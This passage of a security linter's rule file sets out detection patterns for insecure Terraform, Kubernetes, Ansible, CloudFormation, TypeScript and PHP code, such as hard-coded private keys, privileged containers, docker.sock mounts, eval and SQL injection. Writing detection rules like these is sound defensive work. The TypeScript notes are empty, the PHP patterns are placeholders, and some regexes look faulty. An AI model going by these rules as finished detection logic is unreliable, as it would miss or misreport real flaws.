message: 'CWE-798: Use of Hard-Coded Credentials (sensitive data in state)'
tags:
- security
- terraform
- CWE-798
rule:
  kind: output_variable
  pattern: 'output without sensitive = true

    variable without sensitive = true

    '
note: "Terraform state contains plaintext secrets; marking as sensitive reduces exposure.\n\
  \nFIX: Mark sensitive values:\n```hcl\noutput \"db_password\" {\n  value = aws_db_instance.main.password\n\
  \  sensitive = true\n}\n\nvariable \"api_key\" {\n  type = string\n  sensitive =\
  \ true\n}\n```\nReferences: Terraform Documentation, HashiCorp Security\n"
---
id: terraform-cwe-276-gcp-default-sa
language: hcl
severity: error
message: 'CWE-276: Incorrect Default Permissions (GCP default service account)'
tags:
- security
- terraform
- CWE-276
rule:
  kind: resource
  pattern: 'email = "default"

    scopes = ["cloud-platform"]

    '
note: 'Default service accounts have broad permissions.

  Create custom service accounts with minimal permissions instead.


  References: CIS GCP Benchmark 4.1

  '
---
id: terraform-cwe-326-azure-storage-http
language: hcl
severity: error
message: 'CWE-326: Inadequate Encryption Strength (Azure storage HTTP)'
tags:
- security
- terraform
- CWE-326
rule:
  kind: resource
  pattern: 'enable_https_traffic_only = false

    '
note: 'HTTP traffic can be intercepted; data in transit must be encrypted.


  FIX: Enforce HTTPS:

  ```hcl

  enable_https_traffic_only = true

  min_tls_version = "TLS1_2"

  ```

  References: CIS Azure 3.1, tfsec AZU015

  '
---
id: terraform-cwe-345-unpinned-provider
language: hcl
severity: warning
message: 'CWE-345: Insufficient Verification (unpinned provider version)'
tags:
- security
- terraform
- CWE-345
rule:
  kind: provider_version
  pattern: 'Missing version constraint in required_providers

    '
note: "Unpinned providers may introduce breaking changes or vulnerabilities.\n\nFIX:\
  \ Pin provider versions:\n```hcl\nrequired_providers {\n  aws = {\n    source =\
  \ \"hashicorp/aws\"\n    version = \"~> 5.0\"\n  }\n}\n```\nReferences: Terraform\
  \ Best Practices\n"
---
id: terraform-cwe-798-ssh-userdata
language: hcl
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (SSH key in user data)'
tags:
- security
- terraform
- CWE-798
rule:
  kind: user_data
  pattern: 'BEGIN RSA PRIVATE KEY

    BEGIN OPENSSH PRIVATE KEY

    '
note: 'SSH keys in user data are logged and visible in instance metadata.


  FIX: Use AWS Secrets Manager or SSM Parameter Store.

  References: AWS Security Best Practices

  '
---
id: kubernetes-cwe-250-privileged
language: yaml
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (privileged pod)'
tags:
- security
- kubernetes
- CWE-250
- OWASP-A01
rule:
  kind: security_context
  pattern: 'privileged: true

    '
note: "Privileged containers have root access to host, enabling container escape.\n\
  This completely breaks container isolation.\n\nFIX: Disable privileges:\n```yaml\n\
  securityContext:\n  privileged: false\n  allowPrivilegeEscalation: false\n```\n\
  References: CIS Kubernetes 5.2.1, NSA Kubernetes Hardening\n"
---
id: kubernetes-cwe-250-run-as-root
language: yaml
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (running as root)'
tags:
- security
- kubernetes
- CWE-250
rule:
  kind: security_context
  pattern: 'runAsUser: 0

    runAsNonRoot: false

    '
note: "Running as root inside container increases privilege escalation risk.\n\nFIX:\
  \ Run as non-root user:\n```yaml\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser:\
  \ 1000\n  runAsGroup: 1000\n  fsGroup: 1000\n```\nReferences: CIS Kubernetes 5.2.6,\
  \ Pod Security Standards\n"
---
id: kubernetes-cwe-942-host-namespace
language: yaml
severity: error
message: 'CWE-942: Permissive Network Configuration (host namespaces)'
tags:
- security
- kubernetes
- CWE-942
rule:
  kind: pod_spec
  pattern: 'hostNetwork: true

    hostPID: true

    hostIPC: true

    '
note: 'Host namespaces break container isolation, exposing host processes and network.

  Pod gains direct access to host kernel interfaces.


  FIX: Disable host namespace access:

  ```yaml

  hostNetwork: false

  hostPID: false

  hostIPC: false

  ```

  References: CIS Kubernetes 5.2.2-5.2.4

  '
---
id: kubernetes-cwe-770-dos-resources
language: yaml
severity: warning
message: 'CWE-770: Allocation of Resources Without Limits (missing resource limits)'
tags:
- security
- kubernetes
- CWE-770
rule:
  kind: container_spec
  pattern: 'Missing resources section

    '
note: "Without limits, containers can consume all node resources (DoS).\nMisbehaving\
  \ or malicious containers can crash the entire node.\n\nFIX: Define resource limits:\n\
  ```yaml\nresources:\n  limits:\n    cpu: \"500m\"\n    memory: \"512Mi\"\n  requests:\n\
  \    cpu: \"100m\"\n    memory: \"128Mi\"\n```\nReferences: CIS Kubernetes 5.4.1,\
  \ Kubernetes Best Practices\n"
---
id: kubernetes-cwe-276-default-serviceaccount
language: yaml
severity: warning
message: 'CWE-276: Incorrect Default Permissions (default service account)'
tags:
- security
- kubernetes
- CWE-276
rule:
  kind: pod_spec
  pattern: 'serviceAccountName: default

    '
note: 'Default service account may have broader permissions than needed.


  FIX: Use specific service account or disable token mounting:

  ```yaml

  serviceAccountName: my-app-sa

  automountServiceAccountToken: false

  ```

  References: CIS Kubernetes 5.1.5

  '
---
id: kubernetes-cwe-942-no-network-policy
language: yaml
severity: error
message: 'CWE-942: Permissive Network Configuration (missing network policy)'
tags:
- security
- kubernetes
- CWE-942
rule:
  kind: namespace
  pattern: 'Absence of NetworkPolicy resources

    '
note: "Without network policies, all pods can communicate with all other pods.\nNo\
  \ network segmentation or microsegmentation.\n\nFIX: Implement network policies:\n\
  ```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nspec:\n  podSelector:\
  \ {}\n  policyTypes:\n    - Ingress\n    - Egress\n```\nReferences: CIS Kubernetes\
  \ 5.3.2, NSA Kubernetes Hardening\n"
---
id: kubernetes-cwe-250-dangerous-capabilities
language: yaml
severity: error
message: 'CWE-250: Execution with Unnecessary Privileges (dangerous capabilities)'
tags:
- security
- kubernetes
- CWE-250
rule:
  kind: capabilities
  pattern: 'SYS_ADMIN

    NET_RAW

    SYS_PTRACE

    ALL

    '
note: "Dangerous capabilities enable privilege escalation and container escape.\n\n\
  FIX: Drop all, add only required:\n```yaml\nsecurityContext:\n  capabilities:\n\
  \    drop:\n      - ALL\n    add:\n      - NET_BIND_SERVICE\n```\nReferences: CIS\
  \ Kubernetes 5.2.7-5.2.9\n"
---
id: kubernetes-cwe-798-secrets-in-env
language: yaml
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (secrets in env variables)'
tags:
- security
- kubernetes
- CWE-798
rule:
  kind: env_variable
  pattern: 'value: hardcoded_secret

    valueFrom.secretKeyRef mounted as env

    '
note: "Env vars are visible in process listings, logs, and crash dumps.\n\nFIX: Mount\
  \ secrets as files:\n```yaml\nvolumeMounts:\n  - name: secrets\n    mountPath: /secrets\n\
  \    readOnly: true\nvolumes:\n  - name: secrets\n    secret:\n      secretName:\
  \ api-secrets\n```\nReferences: Kubernetes Secrets Best Practices\n"
---
id: kubernetes-cwe-276-writable-rootfs
language: yaml
severity: warning
message: 'CWE-276: Incorrect Default Permissions (writable root filesystem)'
tags:
- security
- kubernetes
- CWE-276
rule:
  kind: security_context
  pattern: 'readOnlyRootFilesystem: false

    Missing readOnlyRootFilesystem

    '
note: "Writable rootfs allows attackers to modify binaries or install malware.\n\n\
  FIX: Use read-only filesystem:\n```yaml\nsecurityContext:\n  readOnlyRootFilesystem:\
  \ true\n```\nReferences: CIS Kubernetes 5.2.4\n"
---
id: kubernetes-cwe-276-hostpath-volume
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (hostPath volumes)'
tags:
- security
- kubernetes
- CWE-276
rule:
  kind: volume
  pattern: "hostPath:\n  path: /\n  path: /var/run/docker.sock\n"
note: 'hostPath volumes bypass container isolation; Docker socket enables container
  escape.


  FIX: Use emptyDir, ConfigMap, Secret, or PersistentVolumeClaim instead.

  References: CIS Kubernetes 5.2.5

  '
---
id: kubernetes-cwe-345-no-pss
language: yaml
severity: error
message: 'CWE-345: Insufficient Verification (missing Pod Security Standards)'
tags:
- security
- kubernetes
- CWE-345
rule:
  kind: namespace
  pattern: 'Missing pod-security.kubernetes.io labels

    '
note: "Pod Security Standards enforce baseline security requirements.\n\nFIX: Apply\
  \ PSS labels:\n```yaml\nmetadata:\n  labels:\n    pod-security.kubernetes.io/enforce:\
  \ restricted\n    pod-security.kubernetes.io/audit: restricted\n```\nReferences:\
  \ Kubernetes Pod Security Standards\n"
---
id: kubernetes-cwe-200-exposed-dashboard
language: yaml
severity: error
message: 'CWE-200: Exposure of Sensitive Information (exposed dashboard)'
tags:
- security
- kubernetes
- CWE-200
rule:
  kind: service
  pattern: 'type: LoadBalancer (for dashboard)

    type: NodePort (for dashboard)

    '
note: 'Exposed dashboard is a common attack vector for cluster compromise.


  FIX: Use ClusterIP with kubectl proxy or ingress with auth.

  References: CVE-2018-18264, Kubernetes Dashboard Security

  '
---
id: kubernetes-cwe-295-tiller-no-tls
language: yaml
severity: error
message: 'CWE-295: Improper Certificate Validation (Tiller without TLS)'
tags:
- security
- kubernetes
- CWE-295
rule:
  kind: deployment
  pattern: 'Helm 2 Tiller deployment without TLS flags

    '
note: 'Tiller without TLS allows any cluster user to deploy as cluster-admin.

  This is deprecated - upgrade to Helm 3.


  References: Helm Security, CVE-2019-18658

  '
---
id: kubernetes-cwe-276-clusterrole-default-sa
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (ClusterRole on default SA)'
tags:
- security
- kubernetes
- CWE-276
rule:
  kind: cluster_role_binding
  pattern: 'subjects with kind: ServiceAccount, name: default

    '
note: 'Binding roles to default SA grants permissions to all pods in namespace.


  FIX: Create specific service accounts with minimal permissions.

  References: CIS Kubernetes 5.1.2

  '
---
id: kubernetes-cwe-345-always-pull
language: yaml
severity: warning
message: 'CWE-345: Insufficient Verification (insecure image pull policy)'
tags:
- security
- kubernetes
- CWE-345
rule:
  kind: container_spec
  pattern: 'imagePullPolicy: IfNotPresent with mutable tags

    '
note: 'Mutable tags with IfNotPresent may run outdated/compromised images.


  FIX: Use digest and Always pull:

  ```yaml

  image: myapp:1.2.3@sha256:abc123...

  imagePullPolicy: Always

  ```

  References: Kubernetes Image Pull Policy

  '
---
id: kubernetes-cwe-94-no-seccomp
language: yaml
severity: warning
message: 'CWE-94: Improper Control of Generation (missing seccomp)'
tags:
- security
- kubernetes
- CWE-94
rule:
  kind: security_context
  pattern: 'seccompProfile.type: Unconfined

    Missing seccompProfile

    '
note: "Seccomp restricts syscalls, reducing attack surface.\n\nFIX: Apply runtime\
  \ default seccomp:\n```yaml\nsecurityContext:\n  seccompProfile:\n    type: RuntimeDefault\n\
  ```\nReferences: Kubernetes Seccomp, Pod Security Standards\n"
---
id: kubernetes-cwe-276-wildcard-rbac
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (wildcard RBAC rules)'
tags:
- security
- kubernetes
- CWE-276
rule:
  kind: rbac_rule
  pattern: 'apiGroups: ["*"]

    resources: ["*"]

    verbs: ["*"]

    '
note: 'Wildcard RBAC grants excessive permissions.


  FIX: Specify exact apiGroups, resources, and verbs needed.

  References: CIS Kubernetes 5.1.3

  '
---
id: kubernetes-cwe-326-unencrypted-secrets
language: yaml
severity: error
message: 'CWE-326: Inadequate Encryption Strength (secrets not encrypted)'
tags:
- security
- kubernetes
- CWE-326
rule:
  kind: cluster_config
  pattern: 'Missing EncryptionConfiguration for secrets

    '
note: 'Secrets are stored base64-encoded (not encrypted) in etcd by default.


  FIX: Enable encryption at rest with EncryptionConfiguration.

  References: CIS Kubernetes 1.2.33

  '
---
id: ansible-cwe-798-hardcoded-password
language: yaml
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (hardcoded password)'
tags:
- security
- ansible
- CWE-798
- OWASP-A02
rule:
  kind: task
  pattern: 'password: "plaintext.*"

    login_password: ".*"

    '
note: 'Passwords in playbooks are visible in VCS and logs.


  FIX: Use Ansible Vault:

  ```yaml

  password: "{{ lookup(''vault'', ''secret/admin_password'') }}"

  ```

  References: Ansible Vault Documentation

  '
---
id: ansible-cwe-532-missing-nolog
language: yaml
severity: error
message: 'CWE-532: Insertion of Sensitive Information into Log File (missing no_log)'
tags:
- security
- ansible
- CWE-532
rule:
  kind: task
  pattern: 'Task with secrets missing no_log: true

    '
note: "Without no_log, sensitive data appears in Ansible output and logs.\n\nFIX:\
  \ Add no_log directive:\n```yaml\n- name: Set API key\n  set_fact:\n    api_key:\
  \ \"{{ vault_api_key }}\"\n  no_log: true\n```\nReferences: Ansible no_log Documentation\n"
---
id: ansible-cwe-78-shell-injection
language: yaml
severity: error
message: 'CWE-78: Improper Neutralization of Special Elements (shell injection)'
tags:
- security
- ansible
- CWE-78
- OWASP-A03
rule:
  kind: task
  pattern: 'shell: .* {{ unquoted_variable }}

    command: "{{ user_input }}"

    '
note: 'Unsanitized input can lead to command injection.


  FIX: Quote variables and use filters:

  ```yaml

  shell: cat "{{ filename | quote }}"

  ```

  References: Ansible Security Best Practices

  '
---
id: ansible-cwe-276-insecure-permissions
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (insecure file permissions)'
tags:
- security
- ansible
- CWE-276
rule:
  kind: task
  pattern: 'mode: "0777"

    mode: "0666"

    mode: "0644" (for private key)

    '
note: "Sensitive files should have restricted permissions.\n\nFIX: Set proper permissions:\n\
  ```yaml\ncopy:\n  mode: \"0600\"\n  owner: root\n  group: root\n```\nReferences:\
  \ CIS Linux Benchmark, Ansible lint\n"
---
id: ansible-cwe-295-http-url
language: yaml
severity: error
message: 'CWE-295: Improper Certificate Validation (HTTP instead of HTTPS)'
tags:
- security
- ansible
- CWE-295
rule:
  kind: task
  pattern: 'url: http://

    '
note: "HTTP traffic can be intercepted; use HTTPS.\n\nFIX: Use HTTPS with verification:\n\
  ```yaml\nget_url:\n  url: https://example.com/package.tar.gz\n  checksum: sha256:abc123...\n\
  ```\nReferences: Ansible Security Guidelines\n"
---
id: ansible-cwe-295-ssl-verify-disabled
language: yaml
severity: error
message: 'CWE-295: Improper Certificate Validation (disabled SSL verification)'
tags:
- security
- ansible
- CWE-295
rule:
  kind: task
  pattern: 'validate_certs: false

    validate_certs: no

    '
note: "Disabling SSL validation enables MITM attacks.\n\nFIX: Enable cert validation\
  \ with proper CA:\n```yaml\nuri:\n  validate_certs: true\n  ca_path: /etc/ssl/certs/ca-certificates.crt\n\
  ```\nReferences: OWASP TLS Best Practices\n"
---
id: ansible-cwe-665-use-modules
language: yaml
severity: warning
message: 'CWE-665: Improper Initialization (using shell instead of modules)'
tags:
- security
- ansible
- CWE-665
rule:
  kind: task
  pattern: 'shell: apt-get install

    command: useradd

    shell: chmod

    '
note: "Modules are idempotent, safer, and provide better error handling.\n\nFIX: Use\
  \ proper modules:\n```yaml\napt:\n  name: nginx\n  state: present\n\nuser:\n  name:\
  \ john\n  create_home: true\n```\nReferences: Ansible Best Practices\n"
---
id: ansible-cwe-250-become-root
language: yaml
severity: warning
message: 'CWE-250: Execution with Unnecessary Privileges (unnecessary become)'
tags:
- security
- ansible
- CWE-250
rule:
  kind: task
  pattern: 'become: true (for non-privileged operation)

    '
note: 'Avoid privilege escalation when not needed.


  FIX: Only use become when required; use become_user for specific users.

  References: Ansible Privilege Escalation

  '
---
id: ansible-cwe-326-ssh-key-passphrase
language: yaml
severity: warning
message: 'CWE-326: Inadequate Encryption Strength (SSH key without passphrase)'
tags:
- security
- ansible
- CWE-326
rule:
  kind: task
  pattern: 'openssh_keypair without passphrase

    '
note: 'Unprotected SSH keys can be stolen and used immediately.


  FIX: Consider using ssh-agent or documenting passphrase requirement.

  References: SSH Key Best Practices

  '
---
id: ansible-cwe-494-git-unverified
language: yaml
severity: warning
message: 'CWE-494: Download of Code Without Integrity Check (git without verification)'
tags:
- security
- ansible
- CWE-494
rule:
  kind: task
  pattern: 'git: repo without version pinning

    '
note: "Unpinned git clones may pull malicious code.\n\nFIX: Pin version and verify\
  \ commits:\n```yaml\ngit:\n  repo: https://github.com/org/repo\n  version: v1.2.3\n\
  \  verify_commit: true\n```\nReferences: Software Supply Chain Security\n"
---
id: ansible-cwe-256-vault-password-file
language: ini
severity: error
message: 'CWE-256: Plaintext Storage of Password (vault password file)'
tags:
- security
- ansible
- CWE-256
rule:
  kind: config_file
  pattern: 'vault_password_file pointing to world-readable file

    '
note: 'Vault password file should be strictly protected.


  FIX: Use GPG-encrypted password file:

  ```ini

  vault_password_file = ~/vault_pass_gpg.sh

  ```

  References: Ansible Vault Security

  '
---
id: ansible-cwe-532-debug-secrets
language: yaml
severity: error
message: 'CWE-532: Insertion of Sensitive Information into Log File (debug secrets)'
tags:
- security
- ansible
- CWE-532
rule:
  kind: task
  pattern: 'debug module showing sensitive variables

    '
note: 'Debug output may be logged or displayed.


  FIX: Remove debug or add no_log.

  References: Ansible Security

  '
---
id: ansible-cwe-327-unencrypted-vault
language: yaml
severity: error
message: 'CWE-327: Use of a Broken Cryptographic Algorithm (unencrypted vault)'
tags:
- security
- ansible
- CWE-327
rule:
  kind: file
  pattern: 'Files named *vault* not starting with $ANSIBLE_VAULT

    '
note: 'Vault files should be encrypted.


  FIX: Encrypt with ansible-vault encrypt file.yml

  References: Ansible Vault

  '
---
id: ansible-cwe-345-unversioned-package
language: yaml
severity: warning
message: 'CWE-345: Insufficient Verification (unversioned package installation)'
tags:
- security
- ansible
- CWE-345
rule:
  kind: task
  pattern: 'state: latest

    Missing version pinning

    '
note: "Unpinned packages may introduce vulnerabilities or breaking changes.\n\nFIX:\
  \ Pin package versions:\n```yaml\napt:\n  name: nginx=1.24.0-1\n  state: present\n\
  ```\nReferences: DevSecOps Best Practices\n"
---
id: ansible-cwe-295-host-key-check-disabled
language: ini
severity: error
message: 'CWE-295: Improper Certificate Validation (host key checking disabled)'
tags:
- security
- ansible
- CWE-295
rule:
  kind: config_file
  pattern: 'host_key_checking = False

    '
note: 'Disabling host key checking enables MITM attacks.


  FIX: Manage known_hosts properly with ssh_known_hosts module.

  References: SSH Security Best Practices

  '
---
id: cloudformation-cwe-798-hardcoded-secrets
language: yaml
severity: error
message: 'CWE-798: Use of Hard-Coded Credentials (hardcoded secrets in parameters)'
tags:
- security
- cloudformation
- CWE-798
- OWASP-A02
rule:
  kind: parameter
  pattern: 'Default: "password.*"

    Default: "secret.*"

    '
note: "Default passwords are visible in templates and may be used accidentally.\n\n\
  FIX: Use NoEcho and no default:\n```yaml\nDatabasePassword:\n  Type: String\n  NoEcho:\
  \ true\n```\nReferences: AWS CloudFormation Security\n"
---
id: cloudformation-cwe-276-iam-wildcard
language: yaml
severity: error
message: 'CWE-276: Incorrect Default Permissions (IAM wildcard permissions)'
tags:
- security
- cloudformation
- CWE-276
rule:
  kind: policy
  pattern: 'Action: "*"

    Resource: "*"

    '
note: 'Violates least privilege principle.


  FIX: Specify exact permissions needed.

  References: AWS IAM Best Practices

  '
---
id: cloudformation-cwe-942-open-sg
language: yaml
severity: error
message: 'CWE-942: Permissive Network Configuration (open security group)'
tags:
- security
- cloudformation
- CWE-942
rule:
  kind: security_group_ingress
  pattern: 'CidrIp: 0.0.0.0/0

    '
note: 'Open security groups expose services to internet.


  FIX: Restrict to specific IPs or security groups.

  References: CIS AWS Benchmark

  '
---
id: cloudformation-cwe-326-unencrypted-ebs
language: yaml
severity: error
message: 'CWE-326: Inadequate Encryption Strength (unencrypted EBS)'
tags:
- security
- cloudformation
- CWE-326
rule:
  kind: resource
  pattern: 'AWS::EC2::Volume without Encrypted: true

    '
note: 'EBS volumes should be encrypted at rest.


  FIX: Enable encryption:

  ```yaml

  Encrypted: true

  KmsKeyId: !Ref KMSKey

  ```

  References: AWS EBS Encryption

  '


---
id: typescript-security-any-type-abuse
message: 'Quality: Prevent any type abuse for injection and security bypasses'
tags:
- security
severity: error
rule:
  pattern: :\s*any\s*[=;,\)]
note: '|'
language: typescript

---
id: typescript-security-type-assertion-bypass
message: 'Quality: Prevent type assertions (as/angle-bracket) that bypass security
  checks'
tags:
- security
severity: error
rule:
  pattern: (as\s+\w+|<\w+>.*as\w+)
note: '|'
language: typescript

---
id: typescript-security-ts-ignore-hiding
message: 'Quality: Prohibit @ts-ignore without security audit and comment'
tags:
- security
severity: error
rule:
  pattern: '@ts-ignore\s*(?![\s\S]*?SECURITY|[\s\S]*?AUDIT)'
note: '|'
language: typescript

---
id: typescript-security-module-augmentation
message: 'Quality: Validate module augmentation to prevent scope pollution and monkey-patching'
tags:
- security
severity: error
rule:
  pattern: declare\s+module\s+["\']
note: '|'
language: typescript

---
id: typescript-security-unsafe-json-parse
message: 'Quality: Validate JSON.parse results with schema validation'
tags:
- security
severity: error
rule:
  pattern: JSON\.parse\s*\([^)]*\)\s*(?!\.)
note: '|'
language: typescript

---
id: typescript-security-eval-dynamic-code
message: 'Quality: Prohibit eval, Function constructor, and dynamic code execution'
tags:
- security
severity: error
rule:
  pattern: (eval\s*\(|new\s+Function\s*\(|Function\s*\()
note: '|'
language: typescript

---
id: typescript-security-nostore-unsafe-global
message: 'Quality: Prevent global state modification without isolation'
tags:
- security
severity: error
rule:
  pattern: (globalThis\.|global\.|Object\.defineProperty\s*\(\s*Object\.prototype)
note: '|'
language: typescript

---
id: typescript-security-object-freeze-enforcement
message: 'Quality: Use Object.freeze on security-critical immutable data'
tags:
- security
severity: warning
rule:
  pattern: const\s+(\w+)\s*=\s*\{\s*[^}]*(?:password|secret|apiKey|token)[^}]*\}
note: '|'
language: typescript

---
id: typescript-security-sql-injection-template
message: 'Quality: Use parameterized queries, never string interpolation for SQL'
tags:
- security
severity: error
rule:
  pattern: (sql`|query\s*\(.*\$\{|`.*SELECT.*\$\{)
note: '|'
language: typescript

---
id: typescript-security-xss-innerHTML
message: 'Quality: Never use innerHTML with untrusted data'
tags:
- security
severity: error
rule:
  pattern: innerHTML\s*=\s*[^;]*(?!DOMPurify|sanitize)
note: '|'
language: typescript

---
id: typescript-performance-excessive-type-complexity
message: 'Quality: Avoid excessively complex generic/conditional types'
tags:
- performance
severity: warning
rule:
  pattern: (?:extends.*\?.*:.*extends.*\?)
note: '|'
language: typescript

---
id: typescript-performance-const-enum-removal
message: 'Quality: Use const enum for compile-time elimination'
tags:
- performance
severity: info
rule:
  pattern: enum\s+\w+\s*\{
note: '|'
language: typescript

---
id: typescript-performance-namespace-overhead
message: 'Quality: Prefer modules over namespaces for runtime efficiency'
tags:
- performance
severity: info
rule:
  pattern: namespace\s+\w+
note: '|'
language: typescript

---
id: typescript-performance-declaration-merging
message: 'Quality: Avoid declaration merging that increases module size'
tags:
- performance
severity: warning
rule:
  pattern: declare\s+(class|function|interface)\s+\w+|interface\s+\w+\s*\{.*\}\s*interface\s+\w+\s*\{
note: '|'
language: typescript

---
id: typescript-performance-tsconfig-module-resolution
message: 'Quality: Optimize tsconfig moduleResolution and noResolve'
tags:
- performance
severity: info
rule:
  pattern: '"moduleResolution":\s*"(classic|node)"'
note: '|'
language: typescript

---
id: typescript-performance-excessive-overloads
message: 'Quality: Limit function overload count (max 3-5 signatures)'
tags:
- performance
severity: warning
rule:
  pattern: function\s+\w+.*\{[^}]*function\s+\w+.*\{[^}]*function\s+\w+
note: '|'
language: typescript

---
id: typescript-performance-large-union-types
message: 'Quality: Avoid unions with 20+ members; use discriminated unions instead'
tags:
- performance
severity: warning
rule:
  pattern: type\s+\w+\s*=\s*.*\|.*\|.*\|.*\|.*\|.*\|.*\|.*\|.*\|.*\|
note: '|'
language: typescript

---
id: typescript-performance-nocompile-without-incremental
message: 'Quality: Enable incremental compilation for large projects'
tags:
- performance
severity: info
rule:
  pattern: '"incremental":\s*false|"noEmit":\s*true'
note: '|'
language: typescript

---
id: typescript-quality-strict-mode-off
message: 'Quality: Enable strict mode in tsconfig.json'
tags:
- quality
severity: error
rule:
  pattern: '"strict":\s*false|"noImplicitAny":\s*false'
note: '|'
language: typescript

---
id: typescript-quality-implicit-any
message: 'Quality: Eliminate implicit any types; add explicit types'
tags:
- quality
severity: error
rule:
  pattern: (?<!:\s)[,\)]\s*(?!.*:\s)
note: '|'
language: typescript

---
id: typescript-quality-missing-return-types
message: 'Quality: Add explicit return type annotations to all functions'
tags:
- quality
severity: error
rule:
  pattern: (?:function|=>|catch)\s+\w+\s*\([^)]*\)(?!\s*:\s*(?:void|Promise|boolean|string|number|unknown|[\w\.]+))
note: '|'
language: typescript

---
id: typescript-quality-unknown-vs-any
message: 'Quality: Use unknown instead of any; forces type narrowing'
tags:
- quality
severity: error
rule:
  pattern: :\s*any(?!\s*\[|\s*\()
note: '|'
language: typescript

---
id: typescript-quality-interface-vs-type
message: 'Quality: Use interface for object shapes; type for unions/aliases'
tags:
- quality
severity: warning
rule:
  pattern: type\s+\w+\s*=\s*\{[^}]*\}
note: '|'
language: typescript

---
id: typescript-quality-generic-constraints
message: 'Quality: Add constraints to generics; avoid unconstrained generics'
tags:
- quality
severity: warning
rule:
  pattern: <\w+\s*(?![^>]*extends)(?:>|,)
note: '|'
language: typescript

---
id: typescript-quality-utility-types
message: 'Quality: Use utility types (Pick, Omit, Partial, Required, Readonly)'
tags:
- quality
severity: warning
rule:
  pattern: interface\s+\w+\s*\{(?!.*Omit|.*Pick|.*Partial|.*Required)[^}]*\}
note: '|'
language: typescript

---
id: typescript-quality-discriminated-unions
message: 'Quality: Use discriminated unions for safe polymorphism'
tags:
- quality
severity: error
rule:
  pattern: type\s+\w+\s*=\s*.*\|\s*.*(?!type\s*:|kind\s*:|kind:|type:|status\s*:|status:)
note: '|'
language: typescript

---
id: typescript-quality-readonly-properties
message: 'Quality: Mark immutable properties as readonly'
tags:
- quality
severity: warning
rule:
  pattern: interface\s+\w+\s*\{(?!.*readonly)[^}]*\s+\w+\s*:[^}]*\}
note: '|'
language: typescript

---
id: typescript-quality-exhaustiveness-checking
message: 'Quality: Use exhaustiveness checking in switch/if-else chains'
tags:
- quality
severity: error
rule:
  pattern: switch\s*\([^)]*\)\s*\{(?!.*default\s*:|_:\s*)
note: '|'
language: typescript

---
id: typescript-quality-avoid-boolean-params
message: 'Quality: Avoid boolean function parameters; use objects or enums'
tags:
- quality
severity: warning
rule:
  pattern: function\s+\w+\s*\([^)]*:\s*boolean
note: '|'
language: typescript

---
id: typescript-quality-nullish-coalescing
message: 'Quality: Use nullish coalescing (??) instead of || for defaults'
tags:
- quality
severity: warning
rule:
  pattern: '([^|]|[^|]\|) \|\| '
note: '|'
language: typescript

---
id: typescript-quality-optional-chaining
message: 'Quality: Use optional chaining (?.) for safe property access'
tags:
- quality
severity: warning
rule:
  pattern: (?!.*\?\.).*\.[a-zA-Z_]\w*\s*(?:\?|\.)
note: '|'
language: typescript

---
id: typescript-quality-avoid-vague-types
message: 'Quality: Avoid vague types like object, {} (empty object)'
tags:
- quality
severity: warning
rule:
  pattern: :\s*(?:object|{}|Object)(?![<\[])
note: '|'
language: typescript

---
id: typescript-quality-enums-const-or-union
message: 'Quality: Prefer const enum or string union over regular enum'
tags:
- quality
severity: info
rule:
  pattern: enum\s+\w+\s*\{[^}]*=[^}]*\}
note: '|'
language: typescript

---
id: typescript-quality-null-checking-order
message: 'Quality: Check null/undefined before type narrowing'
tags:
- quality
severity: warning
rule:
  pattern: (?!if.*null)if.*typeof
note: '|'
language: typescript

---
id: typescript-quality-class-access-modifiers
message: 'Quality: Use access modifiers (public, private, protected) in classes'
tags:
- quality
severity: warning
rule:
  pattern: class\s+\w+\s*\{(?!.*(?:public|private|protected))[^}]*\s+\w+\s*[=;:]
note: '|'
language: typescript

---
id: typescript-quality-unused-variables
message: 'Quality: Remove or prefix unused variables with underscore'
tags:
- quality
severity: info
rule:
  pattern: (?<!_)\b[a-zA-Z_]\w*\b(?!.*=)\s*[:=]
note: '|'
language: typescript

---
id: php-sec-001
language: php
severity: error
message: SQL Injection - Unparameterized Queries
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'SQL Injection - Unparameterized Queries

  '

---
id: php-sec-002
language: php
severity: error
message: SQL Injection - Concatenated WHERE Clauses
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'SQL Injection - Concatenated WHERE Clauses

  '

---
id: php-sec-003
language: php
severity: error
message: XSS - Unescaped Output in HTML Context
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'XSS - Unescaped Output in HTML Context

  '

---
id: php-sec-004
language: php
severity: error
message: XSS - Unescaped Output in JavaScript Context
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'XSS - Unescaped Output in JavaScript Context

  '

---
id: php-sec-005
language: php
severity: error
message: XSS - Unescaped Output in URL Attribute
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'XSS - Unescaped Output in URL Attribute

  '

---
id: php-sec-006
language: php
severity: error
message: XSS - DOM-based XSS via JavaScript Variable Injection
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'XSS - DOM-based XSS via JavaScript Variable Injection

  '

---
id: php-sec-007
language: php
severity: error
message: Command Injection - Unescaped Shell Commands
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Command Injection - Unescaped Shell Commands

  '

---
id: php-sec-008
language: php
severity: error
message: Command Injection - shell_exec with String Concatenation
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Command Injection - shell_exec with String Concatenation

  '

---
id: php-sec-010
language: php
severity: error
message: Remote File Inclusion (RFI) - External URL Inclusion
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'Remote File Inclusion (RFI) - External URL Inclusion

  '

---
id: php-sec-011
language: php
severity: error
message: File Inclusion - Path Traversal via Directory Traversal
tags:
- security
- php
rule:
  kind: call
  pattern: '[pattern]'
note: 'File Inclusion - Path Traversal via Directory Traversal

  '

---
id: php-sec-013
language: php
severity: error
message: Insecure Deserialization - Magic Methods Abuse
tags:
- security
- php
rule:
  kind: call
